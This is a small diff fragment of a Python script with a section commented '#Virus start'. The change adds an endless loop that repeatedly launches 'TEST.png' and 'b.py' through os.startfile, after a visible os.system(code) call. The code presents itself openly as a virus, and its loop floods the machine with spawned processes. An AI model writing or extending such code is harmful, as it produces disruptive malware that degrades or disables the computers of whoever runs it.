@@ -23,10 +23,8 @@ os.system(code)
 
 #Virus start
 while True:
-    try:
-        os.startfile("b.py")
-    except:
-        pass
+    os.startfile("TEST.png")
+    os.startfile("b.py")
 
 
     try:
